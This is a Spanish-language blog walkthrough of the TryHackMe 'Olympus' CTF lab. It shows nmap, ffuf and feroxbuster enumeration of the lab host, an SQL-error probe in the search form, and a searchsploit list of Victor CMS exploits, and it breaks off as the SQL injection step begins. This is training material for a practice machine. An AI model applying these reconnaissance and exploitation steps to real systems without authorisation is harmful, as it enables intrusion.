<!DOCTYPE html><html lang="es-ES" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Try Hack Me - Olympus - Writeup" /><meta property="og:locale" content="es_ES" /><meta name="description" content="En esta guía vamos a trabajar con la máquina Olympus disponible en THM, un interesante CTF de dificultad media creado por G4vr0ch3 en el que pondremos en práctica técnicas de enumeración, SQLi y escalado de privilegios entre otras curiosidades." /><meta property="og:description" content="En esta guía vamos a trabajar con la máquina Olympus disponible en THM, un interesante CTF de dificultad media creado por G4vr0ch3 en el que pondremos en práctica técnicas de enumeración, SQLi y escalado de privilegios entre otras curiosidades." /><link rel="canonical" href="https://ewan67.github.io/posts/thm-writeup-olympus/" /><meta property="og:url" content="https://ewan67.github.io/posts/thm-writeup-olympus/" /><meta property="og:site_name" content="ewan67" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-08-04T02:30:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Try Hack Me - Olympus - Writeup" /><meta name="twitter:site" content="@ewan674" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-09T11:45:26+01:00","datePublished":"2022-08-04T02:30:00+01:00","description":"En esta guía vamos a trabajar con la máquina Olympus disponible en THM, un interesante CTF de dificultad media creado por G4vr0ch3 en el que pondremos en práctica técnicas de enumeración, SQLi y escalado de privilegios entre otras curiosidades.","headline":"Try Hack Me - Olympus - Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://ewan67.github.io/posts/thm-writeup-olympus/"},"url":"https://ewan67.github.io/posts/thm-writeup-olympus/"}</script><title>Try Hack Me - Olympus - Writeup | ewan67</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ewan67"><meta name="application-name" content="ewan67"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/common/ewan67-avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ewan67</a></div><div class="site-subtitle font-italic">La verdadera ignorancia no es la ausencia de conocimiento, sino la negativa a adquirirlo.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>INICIO</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORÍAS</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>ETIQUETAS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ACERCA DE</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ewan67" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ewan674" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ewan67','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Inicio </a> </span> <span>Try Hack Me - Olympus - Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Entrada</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Buscar..."> </span> <span id="search-cancel" >Cancelar</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Try Hack Me - Olympus - Writeup</h1><div class="post-meta text-muted"> <span> Publicado <em class="" data-ts="1659576600" data-df="YYYY-MM-DD" data-toggle="tooltip" data-placement="bottom"> 2022-08-04 </em> </span> <span> Actualizado <em class="" data-ts="1662720326" data-df="YYYY-MM-DD" data-toggle="tooltip" data-placement="bottom"> 2022-09-09 </em> </span><div class="d-flex justify-content-between"> <span> Por <em> <a href="https://twitter.com/ewan674">ewan67</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="6808 palabras"> <em>37 min</em> de lectura</span></div></div></div><div class="post-content"><p>En esta guía vamos a trabajar con la máquina <a href="https://tryhackme.com/room/olympusroom">Olympus</a> disponible en <a href="https://tryhackme.com">THM</a>, un interesante CTF de dificultad media creado por <a href="https://tryhackme.com/p/G4vr0ch3">G4vr0ch3</a> en el que pondremos en práctica técnicas de enumeración, SQLi y escalado de privilegios entre otras curiosidades.</p><p>Dentro música.</p><h2 id="inicio"><span class="mr-2">Inicio</span><a href="#inicio" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><blockquote><p><strong>Disclaimer:</strong> algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.</p></blockquote><p>Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">sudo </span>openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpn
</pre></table></code></div></div><p>Iniciamos la máquina remota dando al botón  <code class="language-plaintext highlighter-rouge" style="background-color:#73c686;color:#fff;">Start Machine</code></p><p>Abrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cd </span>Cybersecurity/THM
<span class="go">
┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">mkdir </span>Olympus
<span class="go">
┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cd </span>Olympus
<span class="go">
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">touch </span>notas
<span class="go">
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"Notas Olympus"</span> <span class="o">&gt;</span> notas
<span class="go">
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nb">cat </span>notas
<span class="go">Notas Olympus
</span></pre></table></code></div></div><p>Con la conexión VPN establecida y la máquina remota iniciada, copiamos las IPs que aparecen en la página de THM correspondientes a nuestro equipo y al server remoto. Esto lo hago por costumbre para no tener que estar escribiéndolas cada vez que necesite utilizarlas en algun comando. En mi caso:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nv">LIP</span><span class="o">=</span>10.18.xx.xx             &lt;- la IP de mi equipo via OpenVPN
<span class="go">
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span><span class="nv">RIP</span><span class="o">=</span>10.10.129.191           &lt;- la IP de la máquina remota
</pre></table></code></div></div><h2 id="reconocimiento--enumeración"><span class="mr-2">Reconocimiento &amp; Enumeración</span><a href="#reconocimiento--enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>En el propio room nos sugiere el autor que empecemos enumerando el server así que vamos con ello.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>nmap <span class="nt">-A</span> <span class="nv">$RIP</span> <span class="nt">-oN</span> nmap_output
</pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-A</code> : escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute)<li><code class="language-plaintext highlighter-rouge">-oN</code> : imprime la salida en un fichero de texto con el nombre <em>nmap_output</em></ul><p>Abrimos el fichero con la salida de <strong>nmap</strong> en nuestro editor preferido y le echamos un ojo. Qué nos está contando ?</p><ul><li><p>que la máquina tiene dos puertos abiertos: el 22/tcp (ssh) y el 80/tcp (http).</p><li><p>que corre un Ubuntu.</p><li><p>que en el puerto 80 hay un Apache/2.4.41 (Ubuntu) escuchando con una redirección 302 contra <em>http://olympus.thm</em></p></ul><p>Probamos a cargar en el navegador la IP del server …</p><p><img data-src="/assets/posts/20220804/img01.png" alt="" data-proofer-ignore></p><p>No rula. Se confirma la redirección. Toca modificar el fichero <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">etc/hosts</code>  de nuestro equipo para resolver la IP añadiendo la siguiente entrada.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>10.10.129.191	olympus.thm
</pre></table></code></div></div><p>Volvemos a probar desde el navegador …</p><p><img data-src="/assets/posts/20220804/img02.png" alt="" data-proofer-ignore></p><p>OK. Empezamos aplicando el procedimiento estandar de reconocimiento manual cuando nos enfrentamos a un sitio web, a saber:</p><ul><li>echamos un ojo a lo que nos muestra, seguimos enlaces, analizamos URLs, probamos funcionalidades, completamos formularios, lanzamos búsquedas, etc, etc; en resumen: trasteamos con él a ver qué nos dice. En nuestro caso no hay mucho donde rascar, pero la index incluye un mensaje que nos vale como primera pista:<blockquote><p>The old version of the website is still accessible on this domain.</p></blockquote><li><p>echamos un ojo al código fuente en busca de comentarios, formularios, nombre del framework, ficheros <em>.js</em> con contenido interesante como llamadas asíncronas, estructura de directorios a partir de los links, etc, etc.</p><li>apuntamos todo lo que nos parezca relevante en nuestro fichero de bitácora <em>notas</em>.</ul><p>Tras el reconocimiento manual, la artillería.</p><p>Para escanear el server tenemos varias herramientas a nuestra disposición: dirb, dirbuster, gobaster, nikto y un largo etc. En este caso vamos a utilizar dos de mis tools preferidas: <strong>ffuf</strong> y <strong>feroxbuster</strong>, ambas disponibles en el repositorio de Kali.</p><p>Empezamos con <strong>ffuf</strong> …</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://olympus.thm/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-c</span> <span class="nt">-t</span> 100 <span class="nt">-o</span> ffuf_output <span class="nt">-of</span> md
</pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-u</code> : la URL que queremos escanear.<li><code class="language-plaintext highlighter-rouge">-w</code> : la ubicación del diccionario.<li><code class="language-plaintext highlighter-rouge">-c</code> : para colorear la salida.<li><code class="language-plaintext highlighter-rouge">-t</code> : nro de hilos concurrentes (por defecto son 40).<li><code class="language-plaintext highlighter-rouge">-o</code> : nombre del fichero donde almacenaremos la salida.<li><code class="language-plaintext highlighter-rouge">-of</code> : formato del fichero de salida, md en nuestro caso.</ul><p>Abrimos el fichero y le echamos un ojo.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre>
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive &lt;3
________________________________________________

 :: Method           : GET
 :: URL              : http://olympus.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Output file      : ffuf_output
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 75ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 75ms]
.hta                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 75ms]
index.php               [Status: 200, Size: 1948, Words: 238, Lines: 48, Duration: 41ms]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 45ms]
phpmyadmin              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 35ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 46ms]
static                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 57ms]
~webmaster              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 45ms]
:: Progress: [4713/4713] :: Job [1/1] :: 1053 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
</pre></table></code></div></div><p>Qué nos cuenta el fuzzeo ? … el último directorio de la lista no es habitual, tendrá relación con lo el mensaje de la index <em>“The old version of the website …”</em> ?</p><p>Vamos con <strong>feroxbuster</strong> …</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://olympus.thm/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt <span class="nt">-e</span> <span class="nt">-t</span> 100 <span class="nt">-o</span> feroxbuster_output
</pre></table></code></div></div><p>Significado de las flags:</p><ul><li><code class="language-plaintext highlighter-rouge">-u</code> : la URL que queremos escanear.<li><code class="language-plaintext highlighter-rouge">-w</code> : la ubicación de nuestro fichero de wordlist.<li><code class="language-plaintext highlighter-rouge">-e</code> : le pedimos que extraiga enlaces del cuerpo de la respuesta y realice nuevas peticiones en función de los resultados.<li><code class="language-plaintext highlighter-rouge">-t</code> : nro de hilos concurrentes.<li><code class="language-plaintext highlighter-rouge">-o</code> : nombre del fichero donde almacenaremos la salida.</ul><p>La velocidad y la cantidad de info que vuelca esta herramienta son una verdadera pasada, volviéndola una alternativa más que interesante a venerables clásicos del rock como dirb, gobuster y cía.</p><p>Echamos un ojo al fichero que nos ha generado.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre>[...]
301      GET        9l       28w      332c http://olympus.thm/~webmaster/admin/js/plugins =&gt; http://olympus.thm/~webmaster/admin/js/plugins/
301      GET        9l       28w      332c http://olympus.thm/~webmaster/admin/js/tinymce =&gt; http://olympus.thm/~webmaster/admin/js/tinymce/
[####################] - 42s    42708/42708   0s      found:129     errors:1189   
[####################] - 14s     4714/4714    328/s   http://olympus.thm/ 
[####################] - 19s     4714/4714    241/s   http://olympus.thm/javascript 
[####################] - 7s      4714/4714    0/s     http://olympus.thm/static/images/ =&gt; Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/static/ =&gt; Directory listing
[####################] - 7s      4714/4714    0/s     http://olympus.thm/static/images =&gt; Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/static =&gt; Directory listing
[####################] - 23s     4714/4714    204/s   http://olympus.thm/~webmaster 
[####################] - 29s     4714/4714    160/s   http://olympus.thm/~webmaster/admin 
[####################] - 22s     4714/4714    218/s   http://olympus.thm/javascript/jquery 
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/css =&gt; Directory listing
[####################] - 15s     4714/4714    0/s     http://olympus.thm/~webmaster/fonts =&gt; Directory listing
[####################] - 4s      4714/4714    0/s     http://olympus.thm/~webmaster/fonts/material-icons =&gt; Directory listing
[####################] - 17s     4716/4714    285/s   http://olympus.thm/~webmaster/img 
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/includes =&gt; Directory listing
[####################] - 10s     4714/4714    0/s     http://olympus.thm/~webmaster/admin/js/ =&gt; Directory listing
[####################] - 8s      4714/4714    0/s     http://olympus.thm/~webmaster/js =&gt; Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/includes/ =&gt; Directory listing
[####################] - 22s     4714/4714    215/s   http://olympus.thm/~webmaster/img/cgi-bin/ 
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/css =&gt; Directory listing
[####################] - 2s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/fonts =&gt; Directory listing
[####################] - 1s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/img =&gt; Directory listing
[####################] - 1s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/includes =&gt; Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/admin/css/ =&gt; Directory listing
[####################] - 16s     4714/4714    288/s   http://olympus.thm/~webmaster/admin/js 
[####################] - 14s     4714/4714    332/s   http://olympus.thm/~webmaster/ 
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/js/ =&gt; Directory listing
[####################] - 0s      4714/4714    0/s     http://olympus.thm/~webmaster/css/ =&gt; Directory listing
[####################] - 8s      4714/4714    0/s     http://olympus.thm/~webmaster/fonts/roboto =&gt; Directory listing
</pre></table></code></div></div><p>El directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">~webmaster</code>  nos está llamando a gritos, así que vamos a ello.</p><p>Cargamos en el navegador la URL</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://olympus.thm/~webmaster
</pre></table></code></div></div><p>y accedemos a esto …</p><p><img data-src="/assets/posts/20220804/img03.png" alt="" data-proofer-ignore></p><p>Bajamos hasta el final de la página …</p><p><img data-src="/assets/posts/20220804/img04.png" alt="" data-proofer-ignore></p><p>Toca trastear. Sed buenos y hacedlo antes de continuar leyendo ;)</p><p>Qué info hemos conseguido ?</p><ul><li><p>El título de la página y la primera entrada del menú horizontal superior nos hablan de un tal <strong>Victor`s CMS</strong>. Búsqueda en Google y los primeros 6 resultados son un festín de vulnerabilidades, exploits y demás alegrías, tanto que cuesta enterarse de que se trata de <em>“A Simple Content Management System”</em> creado por <a href="https://github.com/VictorAlagwu/CMSsite">Victor Alagwu</a>.</p><li><p>Pinchando en cualquiera del resto de opciones del menu superior nos carga la página <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/category.php</code>  pasando un parametro GET <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">?cat_id=1</code>  … ya veremos que se puede rascar de aquí.</p><li><p>Si en el input del Search que aparece al final de la página metemos una sencilla comilla simple y le damos a buscar conseguimos que nos devuelva un error de SQL y parte de la query en cuestión en la página <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/search.php</code> . Menos da una piedra.</p><li><p>Enviando el formulario de Login nos carga <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">/includes/login.php</code>  … una página en blanco con algo de info en el códido fuente.</p></ul><p>Visto lo visto sobre nuestro amigo Victor, a por un exploit de primero.</p><h2 id="análisis-de-vulnerabilidades"><span class="mr-2">Análisis de vulnerabilidades</span><a href="#análisis-de-vulnerabilidades" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Buscamos en nuestro equipo.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="go">┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Olympus]
</span><span class="gp">└─$</span><span class="w"> </span>searchsploit victor cms
<span class="go">------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Victor CMS 1.0 - 'add_user' Persistent Cross-Site Scripting                                                                         | php/webapps/48511.txt
Victor CMS 1.0 - 'cat_id' SQL Injection                                                                                             | php/webapps/48485.txt
Victor CMS 1.0 - 'comment_author' Persistent Cross-Site Scripting                                                                   | php/webapps/48484.txt
Victor CMS 1.0 - 'post' SQL Injection                                                                                               | php/webapps/48451.txt
Victor CMS 1.0 - 'Search' SQL Injection                                                                                             | php/webapps/48734.txt
Victor CMS 1.0 - 'user_firstname' Persistent Cross-Site Scripting                                                                   | php/webapps/48626.txt
Victor CMS 1.0 - Authenticated Arbitrary File Upload                                                                                | php/webapps/48490.txt
Victor CMS 1.0 - File Upload To RCE                                                                                                 | php/webapps/49310.txt
Victor CMS 1.0 - Multiple SQL Injection (Authenticated)                                                                             | php/webapps/49282.txt
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
</span></pre></table></code></div></div><p>El segundo resultado nos refiere una posibilidad de SQLi sobre el parametro <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">cat_id</code>  y nos remite al fichero <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">php/webapps/48485.txt</code>  para mas detalles.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
